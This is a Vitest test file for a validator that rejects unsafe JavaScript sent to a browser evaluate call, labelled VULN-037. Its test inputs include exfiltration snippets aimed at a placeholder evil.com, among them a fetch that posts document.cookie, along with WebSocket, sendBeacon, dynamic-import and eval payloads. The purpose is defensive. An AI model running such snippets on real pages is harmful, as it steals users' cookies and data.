import { describe, expect, it } from "vitest";
import {
  assertSafeEvaluateCode,
  isUnsafeEvaluateCode,
  UnsafeEvaluateCodeError,
} from "./pw-evaluate-validation.js";

describe("VULN-037: Unsafe eval() in Browser", () => {
  describe("isUnsafeEvaluateCode", () => {
    describe("blocks data exfiltration APIs", () => {
      it("blocks fetch()", () => {
        expect(
          isUnsafeEvaluateCode(
            `fetch('https://evil.com', {method: 'POST', body: document.cookie})`,
          ),
        ).toBe(true);
      });
      it("blocks XMLHttpRequest", () => {
        expect(isUnsafeEvaluateCode(`new XMLHttpRequest()`)).toBe(true);
      });
      it("blocks WebSocket", () => {
        expect(isUnsafeEvaluateCode(`new WebSocket('wss://evil.com')`)).toBe(true);
      });
      it("blocks navigator.sendBeacon", () => {
        expect(isUnsafeEvaluateCode(`navigator.sendBeacon('https://evil.com', data)`)).toBe(true);
      });
    });

    describe("blocks code execution APIs", () => {
      it("blocks eval()", () => {
        expect(isUnsafeEvaluateCode(`eval('malicious code')`)).toBe(true);
      });
      it("blocks new Function()", () => {
        expect(isUnsafeEvaluateCode(`new Function('return process')`)).toBe(true);
      });
      it("blocks setTimeout with string", () => {
        expect(isUnsafeEvaluateCode(`setTimeout('alert(1)', 0)`)).toBe(true);
      });
      it("blocks setInterval with string", () => {
        expect(isUnsafeEvaluateCode(`setInterval('alert(1)', 0)`)).toBe(true);
      });
    });

    describe("blocks import/require", () => {
      it("blocks import()", () => {
        expect(isUnsafeEvaluateCode(`import('https://evil.com/module.js')`)).toBe(true);
      });
      it("blocks importScripts", () => {
        expect(isUnsafeEvaluateCode(`importScripts('https://evil.com/script.js')`)).toBe(true);
      });
    });

    describe("allows safe DOM operations", () => {
      it("allows simple return expressions", () => {
        expect(isUnsafeEvaluateCode(`(el) => el.textContent`)).toBe(false);
      });
      it("allows document.querySelector", () => {
        expect(isUnsafeEvaluateCode(`document.querySelector('.class').innerText`)).toBe(false);
      });
      it("allows element property access", () => {
        expect(isUnsafeEvaluateCode(`(el) => ({ text: el.innerText, html: el.innerHTML })`)).toBe(
          false,
        );
      });
      it("allows JSON operations", () => {
        expect(isUnsafeEvaluateCode(`JSON.stringify({ a: 1 })`)).toBe(false);
      });
      it("allows Math operations", () => {
        expect(isUnsafeEvaluateCode(`Math.random()`)).toBe(false);
      });
      it("allows Array methods", () => {
        expect(
          isUnsafeEvaluateCode(`Array.from(document.querySelectorAll('div')).map(el => el.id)`),
        ).toBe(false);
      });
      it("allows setTimeout with function (not string)", () => {
        expect(isUnsafeEvaluateCode(`setTimeout(() => console.log('hi'), 1000)`)).toBe(false);
      });
      it("allows setInterval with function (not string)", () => {
        expect(isUnsafeEvaluateCode(`setInterval(() => tick(), 1000)`)).toBe(false);
      });
    });

    describe("handles edge cases", () => {
      it("is case-insensitive for blocked patterns", () => {
        expect(isUnsafeEvaluateCode(`FETCH('https://evil.com')`)).toBe(true);
        expect(isUnsafeEvaluateCode(`Fetch('https://evil.com')`)).toBe(true);
      });
      it("handles whitespace around patterns", () => {
        expect(isUnsafeEvaluateCode(`  fetch  (  'url'  )`)).toBe(true);
      });
      it("handles patterns in comments (still blocks)", () => {
        // Can't reliably distinguish comments, so we block conservatively
        expect(isUnsafeEvaluateCode(`// fetch('url')\nel.textContent`)).toBe(true);
      });
      it("handles patterns in strings (still blocks)", () => {
        // Can't reliably distinguish strings, so we block conservatively
        expect(isUnsafeEvaluateCode(`"fetch('url')"`)).toBe(true);
      });
      it("handles empty input", () => {
        expect(isUnsafeEvaluateCode("")).toBe(false);
      });
      it("handles whitespace-only input", () => {
        expect(isUnsafeEvaluateCode("   ")).toBe(false);
      });
    });
  });

  describe("assertSafeEvaluateCode", () => {
    it("throws UnsafeEvaluateCodeError for unsafe code", () => {
      expect(() => assertSafeEvaluateCode(`fetch('https://evil.com')`)).toThrow(
        UnsafeEvaluateCodeError,
      );
    });
    it("does not throw for safe code", () => {
      expect(() => assertSafeEvaluateCode(`(el) => el.textContent`)).not.toThrow();
    });
  });

  describe("UnsafeEvaluateCodeError", () => {
    it("has correct error name", () => {
      const error = new UnsafeEvaluateCodeError("fetch");
      expect(error.name).toBe("UnsafeEvaluateCodeError");
    });
    it("includes blocked pattern in message", () => {
      const error = new UnsafeEvaluateCodeError("fetch");
      expect(error.message).toContain("fetch");
    });
    it("describes the security reason", () => {
      const error = new UnsafeEvaluateCodeError("fetch");
      expect(error.message).toMatch(/security|unsafe|blocked/i);
    });
    it("does not leak user code in error message", () => {
      // User code may contain credentials or tokens - must not appear in error
      const sensitiveCode =
        "fetch('https://api.example.com', { headers: { 'Authorization': 'Bearer secret-token-123' } })";
      const error = new UnsafeEvaluateCodeError("fetch", sensitiveCode);
      expect(error.message).not.toContain("secret-token-123");
      expect(error.message).not.toContain("Authorization");
      expect(error.message).not.toContain("Bearer");
    });
  });
});
